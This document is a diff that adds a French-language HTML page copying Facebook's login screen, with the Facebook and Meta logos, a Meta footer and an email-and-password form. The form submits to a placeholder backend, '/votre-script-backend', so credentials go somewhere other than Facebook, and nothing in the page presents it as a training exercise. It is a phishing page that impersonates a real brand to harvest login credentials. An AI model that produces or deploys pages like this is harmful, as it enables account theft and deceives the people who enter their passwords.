@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion Facebook</title>
+
+<style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    background-color: #ffffff;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+}
+
+/* ====== PARTIE HAUTE ====== */
+
+.main {
+    display: flex;
+    justify-content: flex-end;
+    align-items: center;
+    flex: 1;
+    padding-right: 60px;
+    position: relative;
+}
+
+.header-wrapper {
+    position: absolute;
+    top: 20px;
+    left: 20px;
+    display: flex;
+    flex-direction: column;
+}
+
+.logo-top-left {
+    width: 150px;
+}
+
+.header-text {
+    font-size: 56px;
+    font-weight: 600;
+    color: #1c1e21;
+    margin-top: 220px;
+    margin-left: 50px;
+    line-height: 1.2;
+}
+
+.blue-text {
+    color: #1877f2;
+}
+
+.wrapper {
+    display: flex;
+    align-items: center;
+    gap: 60px;
+}
+
+.side-image {
+    width: 600px;
+    height: auto;
+}
+
+.trait {
+    width: 2px; /* Augmentez ce nombre pour élargir le trait (par exemple 4px, 5px, ou plus selon vos besoins) */
+    height: 600px; /* Vous pouvez aussi augmenter cette valeur pour le rendre plus long */
+    background-color: #dadde1;
+    margin-right: -40px;
+}
+
+.container {
+    width: 520px;
+    padding: 40px 32px;
+}
+
+h2 {
+    font-size: 20px;
+    font-weight: 700;
+    color: #1c1e21;
+    margin-bottom: 20px;
+}
+
+input {
+    width: 100%;
+    padding: 18px 20px;
+    margin-bottom: 14px;
+    border-radius: 12px;
+    border: 1.5px solid #dadde1;
+    font-size: 16px;
+}
+
+input:focus {
+    outline: none;
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24,119,242,0.2);
+}
+
+.login-btn {
+    width: 100%;
+    padding: 16px;
+    background: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 50px;
+    font-size: 18px;
+    font-weight: bold;
+    margin-bottom: 16px;
+    cursor: pointer;
+}
+
+.login-btn:hover {
+    background: #166fe5;
+}
+
+.forgot {
+    display: block;
+    text-align: center;
+    margin-bottom: 24px;
+    color: #1c1e21;
+    font-weight: 600;
+    text-decoration: none;
+}
+
+.divider {
+    border: none;
+    border-top: 1px solid #dadde1;
+    margin-bottom: 24px;
+}
+
+.create-btn {
+    width: 100%;
+    padding: 16px;
+    border: 1.5px solid #1877f2;
+    background: transparent;
+    color: #1877f2;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+/* ====== FOOTER ====== */
+
+.footer {
+    background: #fff;
+    padding: 20px 15%;
+    color: #737373;
+    font-size: 12px;
+}
+
+.footer .langs,
+.footer .links {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 10px;
+}
+
+.footer a {
+    color: #737373;
+    text-decoration: none;
+}
+
+.footer a:hover {
+    text-decoration: underline;
+}
+
+.meta {
+    margin-top: 10px;
+}
+.extra-image {
+    width: 11%;
+    margin-top: 15px;
+    margin-left: 198px;
+}
+.footer-line {
+    border: none;
+    border-top: 1px solid #dadde1;
+    margin: 0;
+    margin-bottom: 15px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="main">
+    <div class="header-wrapper">
+        <img src="facebook-new-2023-icon9594.logowik.com.webp" class="logo-top-left">
+        <p class="header-text">
+            Explorez<br>
+            les sujets<br>
+            que <span class="blue-text">vous</span><br>
+            <span class="blue-text">aimez</span>.
+        </p>
+    </div>
+
+    <div class="wrapper">
+        <img src="HpEiFYDux5j.webp" class="side-image">
+        <div class="trait"></div>
+
+        <form class="container" action="/votre-script-backend" method="POST">
+            <h2>Se connecter à Facebook</h2>
+
+            <input type="text" name="email" placeholder="E-mail ou numéro de mobile" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+
+            <button type="submit" class="login-btn">Se connecter</button>
+
+            <a class="forgot" href="#">Mot de passe oublié ?</a>
+
+            <br>
+            <br>
+            <button type="button" class="create-btn">Créer un nouveau compte</button>
+            <img src="1664035558meta-logo-png.webp" alt="Image ajoutée" class="extra-image">
+        </form>
+    </div>
+</div>
+
+<br><br><br><br><br><br><br>
+<hr class="footer-line">
+
+<div class="footer">
+    <div class="langs">
+        <a href="#">Français (France)</a>
+        <a href="#">English (US)</a>
+        <a href="#">Español</a>
+        <a href="#">Türkçe</a>
+        <a href="#">Português (Portugal)</a>
+        <a href="#">العربية</a>
+        <a href="#">Italiano</a>
+        <a href="#">Autres langues...</a>
+    </div>
+    <div class="links">
+        <a href="#">S’inscrire</a>
+        <a href="#">Se connecter</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Vidéo</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Politique de confidentialité</a>
+        <a href="#">Centre de confidentialité</a>
+        <a href="#">Paramètres des cookies</a>
+        <a href="#">À propos</a>
+        <a href="#">Créer une publicité</a>
+        <a href="#">Créer une Page</a>
+        <a href="#">Développeurs</a>
+        <a href="#">Emplois</a>
+        <a href="#">Cookies</a>
+        <a href="#">Choisir sa publicité</a>
+        <a href="#">Conditions générales</a>
+        <a href="#">Aide</a>
+        <a href="#">Importation des contacts et non-utilisateurs</a>
+        <a href="#">Résilier votre contrat ici</a>
+    </div>
+    <div class="meta">
+        Meta © 2026
+    </div>
+</div>
+
+</body>
+</html>
